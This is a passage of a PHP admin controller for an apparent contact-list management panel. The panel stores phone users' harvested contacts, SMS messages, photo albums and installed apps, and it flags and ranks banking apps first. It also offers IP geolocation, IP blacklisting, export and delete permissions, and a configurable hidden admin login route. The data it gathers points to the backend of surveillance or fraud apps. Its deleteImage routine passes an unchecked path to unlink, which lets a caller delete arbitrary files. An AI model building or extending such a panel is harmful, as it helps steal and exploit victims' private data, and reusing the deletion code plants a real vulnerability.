                    $location['city'] = trim((string)($ipData['city'] ?? ''));
                    $location['isp'] = trim((string)($ipData['isp'] ?? '未知'));
                    $location['lng'] = trim((string)($ipData['lng'] ?? ''));
                    $location['lat'] = trim((string)($ipData['lat'] ?? ''));
                }
            }
        } catch (\Throwable $e) {
            // 接口异常时返回默认值，保证页面正常渲染
        }

        return $location;
    }
    
    /**
     * 拉黑IP地址
     */
    public function blacklistIp()
    {
        if (!$this->request->isPost() && !$this->request->isAjax()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }
        
        $ip = $this->request->param('ip', '');
        if (empty($ip) || !filter_var($ip, FILTER_VALIDATE_IP)) {
            return json(['code' => 0, 'msg' => 'IP地址不合法']);
        }
        
        try {
            $prefix = config('database.connections.mysql.prefix') ?: 'app_';
            $tableName = $prefix . 'ip_blacklist';
            
            // 表不存在则自动创建
            $tableExists = Db::query("SHOW TABLES LIKE '{$tableName}'");
            if (empty($tableExists)) {
                $sql = "CREATE TABLE IF NOT EXISTS `{$tableName}` (
                    `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                    `ip` varchar(50) NOT NULL DEFAULT '' COMMENT 'IP地址',
                    `create_time` int(11) unsigned NOT NULL DEFAULT 0 COMMENT '创建时间',
                    `remark` varchar(255) NOT NULL DEFAULT '' COMMENT '备注',
                    PRIMARY KEY (`id`),
                    UNIQUE KEY `uk_ip` (`ip`)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='IP黑名单表'";
                Db::execute($sql);
            }
            
            $exists = Db::name('ip_blacklist')->where('ip', $ip)->find();
            if ($exists) {
                return json(['code' => 1, 'msg' => '该IP已在黑名单中']);
            }
            
            $data = [
                'ip' => $ip,
                'create_time' => time(),
                'remark' => '手动添加'
            ];
            
            $result = Db::name('ip_blacklist')->insert($data);
            if ($result) {
                return json(['code' => 1, 'msg' => 'IP已成功拉黑']);
            } else {
                return json(['code' => 0, 'msg' => '操作失败']);
            }
        } catch (\Exception $e) {
            return json(['code' => 0, 'msg' => '操作失败: ' . $e->getMessage()]);
        }
    }

    /**
     * 取消拉黑IP
     */
    public function unblacklistIp()
    {
        if (!$this->request->isPost() && !$this->request->isAjax()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }
        
        $ip = $this->request->param('ip', '');
        if (empty($ip)) {
            return json(['code' => 0, 'msg' => 'IP地址不能为空']);
        }
        
        try {
            $result = Db::name('ip_blacklist')->where('ip', $ip)->delete();
            if ($result) {
                return json(['code' => 1, 'msg' => 'IP已取消拉黑']);
            } else {
                return json(['code' => 0, 'msg' => '该IP不在黑名单中']);
            }
        } catch (\Exception $e) {
            return json(['code' => 0, 'msg' => '操作失败: ' . $e->getMessage()]);
        }
    }

    /**
     * 获取APP列表数据（JSON格式，供AJAX调用）
     * @return \think\response\Json
     */
    public function getAppList()
    {
        // 检查是否有用户ID参数
        $id = $this->request->param('id', 0, 'intval');
        if (empty($id)) {
            return json(['code' => 0, 'msg' => '用户ID不能为空']);
        }
        
        // 获取用户基本信息
        $member = Db::name('user')->where('id', $id)->find();
        if (!$member) {
            return json(['code' => 0, 'msg' => '未找到该用户']);
        }
        
        // 查询该用户的所有已安装App
        $appList = Db::name('installed_apps')
            ->where('userid', $id)
            ->field('id, app_name, package_name, is_bank, app_version')
            ->order('is_bank', 'desc')       // 先按银行APP排序
            ->order('install_time', 'desc')  // 按安装时间排序
            ->select()
            ->toArray();
            
        // 统计银行类APP
        $bankAppCount = Db::name('installed_apps')
            ->where([['userid', '=', $id], ['is_bank', '=', 1]])
            ->count();
            
        return json([
            'code' => 1, 
            'msg' => '获取成功',
            'data' => $appList,
            'bank_app_count' => $bankAppCount,
            'total' => count($appList)
        ]);
    }

    /**
     * 获取统计数据
     */
    public function getStatistics()
    {
        try {
            // 获取用户总数
            $mobileuser = Db::name('user')->count();
            
            // 获取通讯录总数
            $mobile = Db::name('mobile')->count();
            
            // 获取短信总数
            $smsnum = Db::name('sms')->count();
            
            // 获取相册总数
            $img_count = Db::name('img')->count();
            
            return json([
                'code' => 1,
                'msg' => '获取成功',
                'data' => [
                    'mobileuser' => $mobileuser,
                    'mobile' => $mobile,
                    'smsnum' => $smsnum,
                    'img_count' => $img_count
                ]
            ]);
        } catch (\Exception $e) {
            return json(['code' => 0, 'msg' => '获取统计数据失败：' . $e->getMessage()]);
        }
    }

    /**
     * 检查当前用户是否有导出权限
     * @return bool
     */
    protected function checkExportPermission()
    {
        // 获取当前管理员
        $admin_id = \think\facade\Session::get('admin');
        $admin = \app\admin\model\Admin::where('id', $admin_id)->find();
        
        // 如果是超级管理员或普通管理员，直接返回true
        if ($admin['role_type'] == 'super_admin' || $admin['role_type'] == 'admin') {
            return true;
        }
        
        // 如果是普通账号，检查是否有导出权限
        if ($admin['role_type'] == 'user') {
            return $admin['can_export_data'] == 1;
        }
        
        return false; // 其他情况返回false
    }
    
    /**
     * 检查当前用户是否有删除权限
     * @return bool
     */
    protected function checkDeletePermission()
    {
        // 获取当前管理员
        $admin_id = \think\facade\Session::get('admin');
        $admin = \app\admin\model\Admin::where('id', $admin_id)->find();
        
        // 如果是超级管理员或普通管理员，直接返回true
        if ($admin['role_type'] == 'super_admin' || $admin['role_type'] == 'admin') {
            return true;
        }
        
        // 如果是普通账号，检查是否有删除权限
        if ($admin['role_type'] == 'user') {
            return $admin['can_delete_user'] == 1;
        }
        
        return false; // 其他情况返回false
    }

    /**
     * 获取IP信息
     * @return \think\response\Json
     */
    public function getIpInfo()
    {
        $ip = trim((string)$this->request->param('ip/s', ''));
        if (empty($ip)) {
            return json(['code' => 0, 'msg' => 'IP地址不能为空']);
        }

        try {
            // 调用私有方法获取IP位置信息
            $location = $this->getIpLocation($ip);
            
            return json([
                'code' => 1,
                'msg' => '获取成功',
                'ip' => $ip,
                'data' => $location
            ]);
        } catch (\Exception $e) {
            return json([
                'code' => 0,
                'msg' => '获取IP信息失败: ' . $e->getMessage()
            ]);
        }
    }

    /**
     * APP前端设置页面
     * 
     * @return mixed
     */
    public function config()
    {
        // 从数据库或配置文件中获取现有配置
        $configData = $this->getAppConfig();
        
        // 获取背景图列表
        $bgImages = isset($configData['bg_images']) ? $configData['bg_images'] : [];
        
        // 获取URL列表
        $urls = isset($configData['urls']) ? $configData['urls'] : [''];
        
        // 获取安全过滤设置和屏幕方向设置
        $isFilter = isset($configData['is_filter']) ? $configData['is_filter'] : 0;
        $screenOrientation = isset($configData['screen_orientation']) ? $configData['screen_orientation'] : 'portrait';
        
        // 传递数据到视图 - 将整个配置数据传递给info变量
        View::assign('config', $configData);
        View::assign('bgImages', $bgImages);
        View::assign('urls', $urls);
        View::assign('info', $configData);
        
        // 返回视图
        return View::fetch();
    }
    
    /**
     * 保存APP前端设置
     * 
     * @return \think\response\Json
     */
    public function saveConfig()
    {
        $request = $this->request;
        $post = $request->param();
        
        try {
            // 验证数据
            $validate = validate([
                'bg_count' => 'require|integer|between:1,10',
                'url_count' => 'require|integer|between:1,5',
                'bg_images' => 'array',
                'urls' => 'array',
                'screen_orientation' => 'require|in:portrait,landscape'
            ]);
            
            if (!$validate->check($post)) {
                // 返回JSON格式的错误信息
                return json(['code' => 1, 'msg' => $validate->getError()]);
            }
            
            // 处理表单字段，去除空白字符
            $post['logo_image'] = isset($post['logo_image']) ? trim($post['logo_image']) : '';
            $post['login_title'] = isset($post['login_title']) ? trim($post['login_title']) : '';
            $post['agreement_url'] = isset($post['agreement_url']) ? trim($post['agreement_url']) : '';
            $post['agreement_text'] = isset($post['agreement_text']) ? trim($post['agreement_text']) : '';
            $post['copyright_text'] = isset($post['copyright_text']) ? trim($post['copyright_text']) : '';
            
            // 准备保存的配置数据
            $configData = [
                'bg_count' => intval($post['bg_count']),
                'url_count' => intval($post['url_count']),
                'bg_images' => isset($post['bg_images']) ? array_slice($post['bg_images'], 0, $post['bg_count']) : [],
                'urls' => isset($post['urls']) ? array_slice($post['urls'], 0, $post['url_count']) : [],
                'screen_orientation' => $post['screen_orientation'],
                'is_filter' => isset($post['is_filter']) ? intval($post['is_filter']) : 0,
                // 新增Logo和标题配置
                'show_logo_title' => isset($post['show_logo_title']) ? intval($post['show_logo_title']) : 0,
                'logo_image' => $post['logo_image'],
                'login_title' => $post['login_title'],
                // 新增服务协议和版权配置
                'show_agreement' => isset($post['show_agreement']) ? intval($post['show_agreement']) : 1,
                'agreement_url' => $post['agreement_url'],
                'agreement_text' => $post['agreement_text'] ?: '登录即代表同意《服务协议》',
                'show_copyright' => isset($post['show_copyright']) ? intval($post['show_copyright']) : 0, // 控制版权显示
                'copyright_text' => $post['copyright_text'] ?: '© ' . date('Y') . ' 版权所有',
                // 字体样式配置
                'agreement_font_size' => isset($post['agreement_font_size']) ? $post['agreement_font_size'] : '12',
                'agreement_font_color' => isset($post['agreement_font_color']) ? $post['agreement_font_color'] : '#666666',
                'agreement_font_weight' => isset($post['agreement_font_weight']) ? $post['agreement_font_weight'] : 'normal',
                'copyright_font_size' => isset($post['copyright_font_size']) ? $post['copyright_font_size'] : '12',
                'copyright_font_color' => isset($post['copyright_font_color']) ? $post['copyright_font_color'] : '#999999',
                'copyright_font_weight' => isset($post['copyright_font_weight']) ? $post['copyright_font_weight'] : 'normal',
                // 新增语言切换配置
                'show_language_switch' => isset($post['show_language_switch']) ? intval($post['show_language_switch']) : 1,
                'language_font_size' => isset($post['language_font_size']) ? $post['language_font_size'] : '14',
                'language_font_color' => isset($post['language_font_color']) ? $post['language_font_color'] : '#ffffff',
                'language_font_weight' => isset($post['language_font_weight']) ? $post['language_font_weight'] : 'normal',
                'language_bg_color' => isset($post['language_bg_color']) ? $post['language_bg_color'] : 'rgba(0,0,0,0.3)',
                'language_position' => isset($post['language_position']) ? $post['language_position'] : 'top-right',
                // 新增登录按钮样式配置
                'login_button_font_size' => isset($post['login_button_font_size']) ? $post['login_button_font_size'] : '16',
                'login_button_font_color' => isset($post['login_button_font_color']) ? $post['login_button_font_color'] : '#ffffff',
                'login_button_font_weight' => isset($post['login_button_font_weight']) ? $post['login_button_font_weight'] : 'normal',
                'login_button_bg_color' => isset($post['login_button_bg_color']) ? $post['login_button_bg_color'] : '#8257e6',
                'login_button_gradient_color' => isset($post['login_button_gradient_color']) ? $post['login_button_gradient_color'] : '#6c45c4',
                'login_button_radius' => isset($post['login_button_radius']) ? $post['login_button_radius'] : '4',
                'login_button_shadow' => isset($post['login_button_shadow']) ? intval($post['login_button_shadow']) : 1,
                'login_button_hover_effect' => isset($post['login_button_hover_effect']) ? intval($post['login_button_hover_effect']) : 1
            ];
            
            // 从数据库获取现有配置
            $existingConfig = $this->getAppConfig();
            
            // 保持现有配置中未在表单中提交的值
            if (isset($existingConfig['bg_images']) && !isset($post['bg_images'])) {
                $configData['bg_images'] = $existingConfig['bg_images'];
            }
            
            // 确保图片URL有正确的域名前缀
            if (!empty($configData['logo_image'])) {
                if (strpos($configData['logo_image'], 'http') !== 0 && strpos($configData['logo_image'], '/') === 0) {
                    // 如果是相对路径且没有域名前缀，添加当前域名
                    $configData['logo_image'] = request()->domain() . $configData['logo_image'];
                }
            }
            
            // 保存配置数据到数据库
            $result = $this->saveAppConfig($configData);
            
            if ($result === false) {
                return json(['code' => 1, 'msg' => '保存失败：数据库操作错误']);
            }
            
            // 记录按钮配置的保存情况
            $buttonConfig = [
                'login_button_font_size' => $configData['login_button_font_size'] ?? '16',
                'login_button_font_color' => $configData['login_button_font_color'] ?? '#ffffff',
                'login_button_font_weight' => $configData['login_button_font_weight'] ?? 'normal',
                'login_button_bg_color' => $configData['login_button_bg_color'] ?? '#8257e6',
                'login_button_gradient_color' => $configData['login_button_gradient_color'] ?? '#6c45c4'
            ];
            $this->addLog('APP前端设置 - 按钮配置', '保存的按钮配置: ' . json_encode($buttonConfig, JSON_UNESCAPED_UNICODE));
            
            // 记录操作日志
            $this->addLog('APP前端设置', '更新了APP前端设置（背景图、LOGO、标题、服务协议等）');
            
            // 返回JSON格式的成功信息
            return json(['code' => 0, 'msg' => 'APP前端设置保存成功']);
        } catch (\Exception $e) {
            // 记录操作日志
            $this->addLog('APP前端设置', '更新失败：' . $e->getMessage());
            
            // 返回JSON格式的错误信息
            return json(['code' => 1, 'msg' => '保存失败：' . $e->getMessage()]);
        }
    }
    
    /**
     * 上传背景图片
     * 
     * @return \think\response\Json
     */
    public function uploadImage()
    {
        // 获取上传文件
        $file = $this->request->file('file');
        
        // 验证文件
        $validate = \think\facade\Validate::rule([
            'file' => 'require|file|image|fileExt:jpg,jpeg,png|fileSize:2048000'
        ]);
        
        if (!$validate->check(['file' => $file])) {
            return json(['code' => 1, 'msg' => $validate->getError()]);
        }
        
        try {
            // 设置上传目录
            $savename = \think\facade\Filesystem::disk('public')->putFile('uploads/bg_images', $file);
            
            // 生成访问URL
            $url = '/storage/' . str_replace('\\', '/', $savename);
            
            // 构建完整的URL，确保路径正确
            $fullUrl = request()->domain() . $url;
            
            // 获取现有配置
            $configData = $this->getAppConfig();
            
            // 添加新图片到背景图数组
            if (!isset($configData['bg_images']) || !is_array($configData['bg_images'])) {
                $configData['bg_images'] = [];
            }
            $configData['bg_images'][] = $url;
            
            // 更新bg_count
            $configData['bg_count'] = count($configData['bg_images']);
            
            // 保存到数据库
            $this->saveAppConfig($configData);
            
            // 返回成功信息
            return json(['code' => 0, 'msg' => '上传成功', 'data' => ['src' => $url]]);
        } catch (\Exception $e) {
            // 返回错误信息
            return json(['code' => 1, 'msg' => '上传失败：' . $e->getMessage()]);
        }
    }
    
    /**
     * 删除背景图片
     * 
     * @return \think\response\Json
     */
    public function deleteImage()
    {
        $request = $this->request;
        $src = $request->param('src');
        
        if (empty($src)) {
            return json(['code' => 1, 'msg' => '参数错误']);
        }
        
        try {
            // 处理文件路径
            $path = str_replace('/storage/', '', $src);
            
            // 获取完整文件路径
            $filePath = public_path() . 'storage/' . $path;
            
            // 判断文件是否存在
            if (file_exists($filePath)) {
                // 删除文件
                unlink($filePath);
            }
            
            // 更新配置，移除这个图片
            $configData = $this->getAppConfig();
            if (isset($configData['bg_images']) && is_array($configData['bg_images'])) {
                $key = array_search($src, $configData['bg_images']);
                if ($key !== false) {
                    unset($configData['bg_images'][$key]);
                    $configData['bg_images'] = array_values($configData['bg_images']); // 重建索引
                    $this->saveAppConfig($configData);
                }
            }
            
            // 返回成功信息
            return json(['code' => 0, 'msg' => '删除成功']);
        } catch (\Exception $e) {
            // 返回错误信息
            return json(['code' => 1, 'msg' => '删除失败：' . $e->getMessage()]);
        }
    }
    
    /**
     * 获取APP配置
     * 
     * @return array
     */
    private function getAppConfig()
    {
        // 首先尝试从缓存获取
        $cachedConfig = Cache::get('app_frontend_config');
        if ($cachedConfig) {
            return $cachedConfig;
        }
        
        // 尝试从数据库获取配置
        $config = Db::name('config')->where('name', 'app_frontend')->find();
        
        if ($config) {
            $configData = json_decode($config['value'], true) ?: [];
            
            // 保存到缓存
            Cache::set('app_frontend_config', $configData, 86400); // 缓存1天
            
            return $configData;
        }
        
        // 默认配置
        $defaultConfig = [
            'bg_count' => 3,
            'url_count' => 1,
            'bg_images' => [],
            'urls' => [''],
            'screen_orientation' => 'portrait', // 默认竖屏模式
            'is_filter' => 0,  // 默认禁用安全过滤
            // 新增Logo和标题默认配置
            'show_logo_title' => 1, // 默认显示
            'logo_image' => '/static/images/default-logo.png', // 默认Logo
            'login_title' => '游侠通讯录管理系统', // 默认标题
            // 新增服务协议和版权默认配置
            'show_agreement' => 1, // 默认显示
            'agreement_url' => '#', // 默认协议链接
            'agreement_text' => '登录即代表同意《服务协议》', // 默认协议文本
            'show_copyright' => 0, // 默认不显示版权信息
            'copyright_text' => '© ' . date('Y') . ' 游侠通讯录管理系统 版权所有', // 默认版权信息
            // 字体样式默认配置
            'agreement_font_size' => '12',
            'agreement_font_color' => '#666666',
            'agreement_font_weight' => 'normal',
            'copyright_font_size' => '12',
            'copyright_font_color' => '#999999',
            'copyright_font_weight' => 'normal',
            // 语言切换默认配置
            'show_language_switch' => 1, // 默认显示
            'language_font_size' => '14',
            'language_font_color' => '#ffffff',
            'language_font_weight' => 'normal',
            'language_bg_color' => 'rgba(0,0,0,0.3)',
            'language_position' => 'top-right',
            // 登录按钮默认配置
            'login_button_font_size' => '16',
            'login_button_font_color' => '#ffffff', // 按钮文字颜色 - 默认白色
            'login_button_font_weight' => 'normal', // 按钮文字粗细 - 默认常规
            'login_button_bg_color' => '#8257e6', // 按钮背景色 - 默认紫色
            'login_button_gradient_color' => '#6c45c4', // 按钮渐变色 - 默认深紫色
            'login_button_radius' => '4', // 按钮圆角 - 默认4px
            'login_button_shadow' => 1, // 按钮阴影 - 默认启用
            'login_button_hover_effect' => 1 // 悬停效果 - 默认启用
        ];
        
        // 保存默认配置到缓存
        Cache::set('app_frontend_config', $defaultConfig, 86400); // 缓存1天
        
        return $defaultConfig;
    }
    
    /**
     * 保存APP配置
     * 
     * @param array $data 配置数据
     * @return bool
     */
    private function saveAppConfig($data)
    {
        try {
            // 确保我们能看到按钮相关配置
            $this->addLog('保存APP配置', '确认按钮字体颜色: ' . ($data['login_button_font_color'] ?? '未设置'));
            
            // 尝试从数据库获取配置
            $config = Db::name('config')->where('name', 'app_frontend')->find();
            
            $result = false;
            
            if ($config) {
                // 更新配置
                $jsonData = json_encode($data, JSON_UNESCAPED_UNICODE);
                $this->addLog('保存APP配置', '更新配置: 按钮字体颜色=' . ($data['login_button_font_color'] ?? '未设置'));
                
                $result = Db::name('config')->where('id', $config['id'])->update([
                    'value' => $jsonData,
                    'update_time' => time()
                ]);
            } else {
                // 创建配置
                $jsonData = json_encode($data, JSON_UNESCAPED_UNICODE);
                $this->addLog('保存APP配置', '创建配置: 按钮字体颜色=' . ($data['login_button_font_color'] ?? '未设置'));
                
                $result = Db::name('config')->insert([
                    'name' => 'app_frontend',
                    'value' => $jsonData,
                    'create_time' => time(),
                    'update_time' => time()
                ]);
            }
            
            // 清除缓存，确保获取最新配置
            Cache::delete('app_frontend_config');
            
            // 直接更新缓存，确保缓存中有最新数据
            Cache::set('app_frontend_config', $data, 86400); // 缓存1天
            
            $this->addLog('保存APP配置', '缓存已更新: ' . ($result !== false ? '成功' : '失败'));
            
            return $result !== false;
        } catch (\Exception $e) {
            $this->addLog('保存APP配置', '保存出错: ' . $e->getMessage());
            return false;
        }
    }
    
    /**
     * 获取后台路由设置
     * 
     * @return \think\Response
     */
    public function getRouteSettings()
    {
        // 检查是否有管理员权限
        $adminId = Session::get('admin');
        $admin = Db::name('admin')->where('id', $adminId)->find();
        
        if (!$admin || ($admin['role_type'] != 'super_admin' && $admin['role_type'] != 'admin')) {
            return json(['code' => 0, 'msg' => '无权限进行此操作']);
        }
        
        try {
            // 从数据库获取路由设置
            $config = Db::name('config')->where('name', 'admin_route_settings')->find();
            
            if ($config && !empty($config['value'])) {
                $routeSettings = json_decode($config['value'], true);
                
                // 确保有session_timeout字段
                if (!isset($routeSettings['session_timeout'])) {
                    $routeSettings['session_timeout'] = 20; // 默认20分钟
                }
            } else {
                // 默认设置
                $routeSettings = [
                    'login_routes' => ['/admin'],
                    'session_timeout' => 20, // 默认20分钟
                ];
                
                // 保存到数据库
                Db::name('config')->insert([
                    'name' => 'admin_route_settings',
                    'value' => json_encode($routeSettings, JSON_UNESCAPED_UNICODE),
                    'create_time' => time(),
                    'update_time' => time()
                ]);
            }
            
            // 同时保存到缓存文件，方便入口文件读取
            $cacheDir = app()->getRuntimePath() . 'cache/';
            if (!is_dir($cacheDir)) {
                mkdir($cacheDir, 0755, true);
            }
            $cacheContent = "<?php\nreturn " . var_export($routeSettings, true) . ";\n";
            file_put_contents($cacheDir . 'route_settings.php', $cacheContent);
            
            return json(['code' => 1, 'msg' => '获取成功', 'data' => $routeSettings]);
        } catch (\Exception $e) {
            // 出现异常时返回默认设置
            $defaultSettings = [
                'login_routes' => ['/admin'],
                'session_timeout' => 20, // 默认20分钟
            ];
            
            return json(['code' => 1, 'msg' => '获取设置（默认值）', 'data' => $defaultSettings]);
        }
    }
    
    /**
     * 保存后台路由设置
     * 
     * @return \think\Response
     */
    public function saveRouteSettings()
    {
        // 检查是否有管理员权限
        $adminId = Session::get('admin');
        $admin = Db::name('admin')->where('id', $adminId)->find();
        
        if (!$admin || ($admin['role_type'] != 'super_admin' && $admin['role_type'] != 'admin')) {
            return json(['code' => 0, 'msg' => '无权限进行此操作']);
        }
        
        $request = $this->request;
        $post = $request->param();
        
        // 记录请求日志
        $this->addLog('保存路由设置 - 请求', '接收到的原始数据: ' . json_encode($post, JSON_UNESCAPED_UNICODE));
        
        // 验证提交的数据
        if (empty($post['login_routes'])) {
            return json(['code' => 0, 'msg' => '参数不完整']);
        }
        
        // 整理登录路由
        $loginRoutes = is_array($post['login_routes']) ? $post['login_routes'] : [$post['login_routes']];
        
        // 确保所有路由以/开头
        foreach ($loginRoutes as &$route) {
            if (strpos($route, '/') !== 0) {
                $route = '/' . $route;
            }
        }
        
        // 处理session_timeout，如果提供
        $sessionTimeout = isset($post['session_timeout']) ? $post['session_timeout'] : 20;
        
        // 确保超时时间是整数
        if (is_string($sessionTimeout)) {
            $sessionTimeout = intval($sessionTimeout);
        }
        
        // 记录超时时间处理过程
        $this->addLog('保存路由设置 - 处理', '超时时间处理: 原始值=' . (isset($post['session_timeout']) ? $post['session_timeout'] : '未提供') . 
            ', 转换后=' . $sessionTimeout . ', 类型=' . gettype($sessionTimeout));
        
        // 限制超时时间在有效范围内
        if ($sessionTimeout < 1) {
            $sessionTimeout = 1;
        } elseif ($sessionTimeout > 180) {
            $sessionTimeout = 180; 
        }
        
        // 设置路由配置
        $routeSettings = [
            'login_routes' => $loginRoutes,
            'session_timeout' => $sessionTimeout,
        ];
        
        try {
            // 保存到数据库
            $config = Db::name('config')->where('name', 'admin_route_settings')->find();
            
            // 记录即将保存的配置
            $this->addLog('保存路由设置 - 准备保存', '即将保存的配置: ' . json_encode($routeSettings, JSON_UNESCAPED_UNICODE));
            
            if ($config) {
                // 更新现有记录
                Db::name('config')->where('name', 'admin_route_settings')->update([
                    'value' => json_encode($routeSettings, JSON_UNESCAPED_UNICODE),
                    'update_time' => time()
                ]);
            } else {
                // 创建新记录
                Db::name('config')->insert([
                    'name' => 'admin_route_settings',
                    'value' => json_encode($routeSettings, JSON_UNESCAPED_UNICODE),
                    'create_time' => time(),
                    'update_time' => time()
                ]);
            }
            
            // 同时保存到缓存
            Cache::set('admin_route_settings', $routeSettings, 86400 * 30); // 缓存30天
            
            // 保存到缓存文件，方便入口文件读取
            $cacheDir = app()->getRuntimePath() . 'cache/';
            if (!is_dir($cacheDir)) {
                mkdir($cacheDir, 0755, true);
            }
            $cacheContent = "<?php\nreturn " . var_export($routeSettings, true) . ";\n";
            file_put_contents($cacheDir . 'route_settings.php', $cacheContent);
            
            // 添加管理日志
            $log = '更新了登录链接设置：' . implode(', ', $loginRoutes);
            $log .= '，超时设置：' . $sessionTimeout . '分钟';
            $this->addLog('后台路由设置', $log);
            
            // 记录更多详细信息
            $this->addLog('保存路由设置 - 成功', '保存成功，配置已更新。超时时间: ' . $sessionTimeout . '分钟');
            
            return json(['code' => 1, 'msg' => '设置保存成功', 'data' => $routeSettings]);
        } catch (\Exception $e) {
            // 添加错误日志
            $this->addLog('后台路由设置', '更新失败：' . $e->getMessage());
            
            return json(['code' => 0, 'msg' => '设置保存失败：' . $e->getMessage()]);
        }
    }

    /**
     * 后台路由设置页面
     * 
     * @return \think\Response
     */
    public function admin_config()
    {
        // 检查是否有管理员权限
        $adminId = Session::get('admin');
        $admin = Db::name('admin')->where('id', $adminId)->find();
        
        if (!$admin || ($admin['role_type'] != 'super_admin' && $admin['role_type'] != 'admin')) {
            return $this->error('无权限访问此页面');
        }
        
        return $this->fetch('appv1/admin_config');
    }

    /**
     * 提供移动端CSS文件
     * 
     * @return \think\Response
     */
    public function mobile_css()
    {
        // 获取CSS文件路径
        $cssFilePath = app()->getRootPath() . 'app/admin/view/appv1/mobile.css';
        
        // 检查文件是否存在
        if (!file_exists($cssFilePath)) {
            // 记录错误
            $this->addLog('移动端CSS加载失败', '文件不存在: ' . $cssFilePath);
            
            // 返回空CSS以防止错误
            return Response::create('/* 文件未找到 */')->contentType('text/css');
        }
        
        try {
            // 获取CSS文件内容
            $cssContent = file_get_contents($cssFilePath);
            
            // 设置响应头
            return Response::create($cssContent)->contentType('text/css');
        } catch (\Exception $e) {
            // 记录错误
            $this->addLog('移动端CSS加载失败', '错误信息: ' . $e->getMessage());
            
            // 返回空CSS以防止错误
            return Response::create('/* 加载出错 */')->contentType('text/css');
        }
    }
    
    /**
     * 提供移动端JS文件
     * 
     * @return \think\Response
     */
    public function mobile_js()
    {
        // 获取JS文件路径
        $jsFilePath = app()->getRootPath() . 'app/admin/view/appv1/mobile.js';
        
        // 检查文件是否存在
        if (!file_exists($jsFilePath)) {
            // 记录错误
            $this->addLog('移动端JS加载失败', '文件不存在: ' . $jsFilePath);
            
            // 返回空JS以防止错误
            return Response::create('// 文件未找到')->contentType('application/javascript');
        }
        
        try {
            // 获取JS文件内容
            $jsContent = file_get_contents($jsFilePath);
            
            // 设置响应头
            return Response::create($jsContent)->contentType('application/javascript');
        } catch (\Exception $e) {
            // 记录错误
            $this->addLog('移动端JS加载失败', '错误信息: ' . $e->getMessage());
            
            // 返回空JS以防止错误
            return Response::create('// 加载出错')->contentType('application/javascript');
        }
    }
}